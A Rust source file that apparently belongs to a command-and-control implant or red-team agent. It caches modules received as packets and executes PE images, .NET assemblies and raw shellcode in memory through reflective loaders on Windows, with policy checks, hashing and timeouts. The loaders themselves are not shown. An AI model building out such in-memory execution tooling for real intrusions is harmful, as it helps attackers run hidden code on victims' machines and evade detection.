use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;
use common::packets::{ModuleData, ModuleExecution, ModuleExecutionResult, ModuleType};

#[cfg(target_os = "windows")]
use crate::features::reflective_loader;
#[cfg(target_os = "windows")]
use crate::features::dotnet_loader;
#[cfg(target_os = "windows")]
use crate::features::module_security::{
    ModuleSecurityPolicy, validate_module_security, calculate_module_hash, sanitize_module_args
};

/// Global module cache
static MODULE_CACHE: Lazy<Arc<Mutex<HashMap<String, ModuleData>>>> = Lazy::new(|| {
    Arc::new(Mutex::new(HashMap::new()))
});

/// Global security policy
static SECURITY_POLICY: Lazy<Arc<Mutex<ModuleSecurityPolicy>>> = Lazy::new(|| {
    Arc::new(Mutex::new(ModuleSecurityPolicy::default()))
});

/// Set security policy for module loading
pub fn set_security_policy(policy: ModuleSecurityPolicy) {
    if let Ok(mut p) = SECURITY_POLICY.lock() {
        *p = policy;
    }
}

/// Get current security policy
pub fn get_security_policy() -> ModuleSecurityPolicy {
    SECURITY_POLICY.lock()
        .map(|p| p.clone())
        .unwrap_or_default()
}

/// Load a module into memory cache
pub fn load_module(module: ModuleData) -> Result<(), String> {
    let mut cache = MODULE_CACHE.lock().map_err(|e| format!("Failed to lock cache: {}", e))?;
    
    // Validate module data
    if module.data.is_empty() {
        return Err("Module data is empty".to_string());
    }
    
    // Security validation
    #[cfg(target_os = "windows")]
    {
        let policy = get_security_policy();
        validate_module_security(&module.data, &policy)?;
    }
    
    println!("Loading module: {} (type: {:?}, size: {} bytes)", 
             module.name, module.module_type, module.data.len());
    
    // Calculate and log module hash for verification
    #[cfg(target_os = "windows")]
    {
        let hash = calculate_module_hash(&module.data);
        println!("Module hash: {}", hash);
    }
    
    cache.insert(module.id.clone(), module);
    Ok(())
}

/// Execute a loaded module
pub async fn execute_module(execution: ModuleExecution) -> ModuleExecutionResult {
    // Security: Sanitize arguments
    #[cfg(target_os = "windows")]
    let sanitized_args = sanitize_module_args(&execution.args);
    #[cfg(not(target_os = "windows"))]
    let sanitized_args = execution.args.clone();
    
    // Security: Validate timeout
    #[cfg(target_os = "windows")]
    {
        let policy = get_security_policy();
        if policy.enforce_timeout {
            let timeout = execution.timeout.unwrap_or(policy.max_timeout_seconds);
            if timeout > policy.max_timeout_seconds {
                return ModuleExecutionResult {
                    module_id: execution.module_id.clone(),
                    success: false,
                    output: String::new(),
                    error: format!(
                        "Timeout {} exceeds maximum allowed {}",
                        timeout, policy.max_timeout_seconds
                    ),
                    exit_code: -1,
                };
            }
        }
    }
    
    // Get module from cache
    let module = {
        let cache = match MODULE_CACHE.lock() {
            Ok(cache) => cache,
            Err(e) => {
                return ModuleExecutionResult {
                    module_id: execution.module_id,
                    success: false,
                    output: String::new(),
                    error: format!("Failed to lock module cache: {}", e),
                    exit_code: -1,
                };
            }
        };
        
        match cache.get(&execution.module_id) {
            Some(m) => m.clone(),
            None => {
                return ModuleExecutionResult {
                    module_id: execution.module_id,
                    success: false,
                    output: String::new(),
                    error: "Module not found in cache".to_string(),
                    exit_code: -1,
                };
            }
        }
    };
    
    println!("Executing module: {} with args: {:?}", module.name, sanitized_args);
    
    // Create new execution with sanitized args
    let sanitized_execution = ModuleExecution {
        module_id: execution.module_id.clone(),
        args: sanitized_args,
        timeout: execution.timeout,
    };
    
    // Execute based on module type
    #[cfg(target_os = "windows")]
    {
        match module.module_type {
            ModuleType::PE => {
                reflective_loader::execute_pe_module(&module, &sanitized_execution).await
            }
            ModuleType::DotNetAssembly => {
                dotnet_loader::execute_dotnet_assembly(&module, &sanitized_execution).await
            }
            ModuleType::Shellcode => {
                reflective_loader::execute_shellcode(&module, &sanitized_execution).await
            }
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        ModuleExecutionResult {
            module_id: execution.module_id,
            success: false,
            output: String::new(),
            error: "Module execution only supported on Windows".to_string(),
            exit_code: -1,
        }
    }
}

/// Unload a module from memory
pub fn unload_module(module_id: &str) -> Result<(), String> {
    let mut cache = MODULE_CACHE.lock().map_err(|e| format!("Failed to lock cache: {}", e))?;
    
    if cache.remove(module_id).is_some() {
        println!("Unloaded module: {}", module_id);
        Ok(())
    } else {
        Err("Module not found".to_string())
    }
}

/// List all loaded modules
pub fn list_modules() -> Vec<String> {
    match MODULE_CACHE.lock() {
        Ok(cache) => cache.keys().cloned().collect(),
        Err(_) => Vec::new(),
    }
}

/// Clear all modules from cache
pub fn clear_all_modules() {
    if let Ok(mut cache) = MODULE_CACHE.lock() {
        cache.clear();
        println!("Cleared all modules from cache");
    }
}
